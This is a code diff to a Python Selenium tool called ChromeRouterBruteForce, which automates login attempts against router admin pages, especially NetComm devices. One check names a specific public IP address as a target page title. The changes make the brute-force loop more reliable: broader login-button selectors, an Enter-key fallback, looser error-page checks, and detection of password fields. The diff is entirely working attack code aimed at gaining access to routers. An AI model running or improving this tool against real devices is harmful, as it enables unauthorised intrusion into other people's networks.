@@ -876,16 +876,50 @@ class ChromeRouterBruteForce:
             
             # For NetComm routers, try specific JavaScript methods
             try:
-                # Try to find and click login button
-                login_buttons = self.driver.find_elements("css selector", "input[type='submit'], button[type='submit'], input[value*='Login'], button:contains('Login'), input[value*='Sign'], button:contains('Sign')")
+                # Try to find and click login button with safer selectors
+                login_buttons = []
+                
+                # Try different button selectors
+                button_selectors = [
+                    "input[type='submit']",
+                    "button[type='submit']", 
+                    "input[value*='Login']",
+                    "input[value*='Sign']",
+                    "button:contains('Login')",
+                    "button:contains('Sign')",
+                    "input[value='Login']",
+                    "input[value='Sign In']",
+                    "button",
+                    "input[type='button']"
+                ]
+                
+                for selector in button_selectors:
+                    try:
+                        buttons = self.driver.find_elements("css selector", selector)
+                        if buttons:
+                            login_buttons.extend(buttons)
+                            break
+                    except:
+                        continue
                 
                 if login_buttons:
-                    login_buttons[0].click()
-                    print(f"{Colors.BLUE}[*] Login button clicked{Colors.END}")
+                    # Try to click the first visible button
+                    for button in login_buttons:
+                        try:
+                            if button.is_displayed() and button.is_enabled():
+                                button.click()
+                                print(f"{Colors.BLUE}[*] Login button clicked{Colors.END}")
+                                break
+                        except:
+                            continue
+                    else:
+                        # If no button worked, try pressing Enter
+                        password_field.send_keys("\n")
+                        print(f"{Colors.BLUE}[*] Enter key pressed (no clickable button found){Colors.END}")
                 else:
                     # Try pressing Enter
                     password_field.send_keys("\n")
-                    print(f"{Colors.BLUE}[*] Enter key pressed{Colors.END}")
+                    print(f"{Colors.BLUE}[*] Enter key pressed (no button found){Colors.END}")
                 
                 time.sleep(5)
                 
@@ -1098,8 +1132,8 @@ class ChromeRouterBruteForce:
             if any(error in page_source for error in error_indicators):
                 return "error", "Error page detected"
             
-            # Check for specific error patterns in title
-            if page_title and any(error in page_title.lower() for error in ['error', 'not found', 'unavailable', 'timeout']):
+            # Check for specific error patterns in title (but be more lenient)
+            if page_title and any(error in page_title.lower() for error in ['error', 'not found', 'unavailable', 'timeout', 'this site can\'t be reached', 'connection refused']):
                 return "error", f"Error page detected in title: {page_title}"
             
             # Check for empty or generic titles that might indicate errors
@@ -1111,16 +1145,24 @@ class ChromeRouterBruteForce:
                     body_text = self.driver.find_element("tag name", "body").text.lower()
                     if any(error in body_text for error in error_indicators):
                         return "error", "Error page detected in body content"
-                    elif len(body_text.strip()) < 5:  # Very little content - be more lenient
+                    elif len(body_text.strip()) < 3:  # Very little content - be more lenient
                         return "error", "Page appears to be empty or error page"
                     # If we have some content, don't treat as error - might be a valid page
+                    print(f"{Colors.BLUE}[*] Empty title but has content ({len(body_text)} chars), continuing...{Colors.END}")
                 except:
                     # If we can't get body text, don't assume it's an error
-                    pass
-            elif page_title in ['211.27.181.3', 'NetComm']:
+                    print(f"{Colors.BLUE}[*] Empty title but can't check content, continuing...{Colors.END}")
+            elif page_title in ['211.27.181.3', 'NetComm', 'NetComm Wireless Limited']:
                 # These might be valid router pages, don't treat as error immediately
                 # Let the authentication type detection handle it
-                pass
+                print(f"{Colors.BLUE}[*] Generic title '{page_title}', checking for valid content...{Colors.END}")
+                try:
+                    body_text = self.driver.find_element("tag name", "body").text.lower()
+                    if any(error in body_text for error in error_indicators):
+                        return "error", "Error page detected in body content"
+                    print(f"{Colors.BLUE}[*] Generic title but valid content found, continuing...{Colors.END}")
+                except:
+                    print(f"{Colors.BLUE}[*] Generic title but can't check content, continuing...{Colors.END}")
             
             # 🔍 **1. Check for API-Based Authentication**
             api_indicators = ['api', 'json', 'rest', 'ajax', 'xhr', 'fetch', 'axios', 'endpoint', 'service']
@@ -1165,6 +1207,9 @@ class ChromeRouterBruteForce:
                 elif form_count >= 2:
                     print(f"{Colors.GREEN}[+] Form-based authentication detected (by content){Colors.END}")
                     return "form", "Form-based authentication detected by content"
+                elif len(password_inputs) > 0:  # If we have password field, it's likely a form
+                    print(f"{Colors.GREEN}[+] Form-based authentication detected (password field found){Colors.END}")
+                    return "form", "Form-based authentication detected (password field)"
                     
             except Exception as e:
                 print(f"{Colors.YELLOW}[!] Error detecting form fields: {e}{Colors.END}")
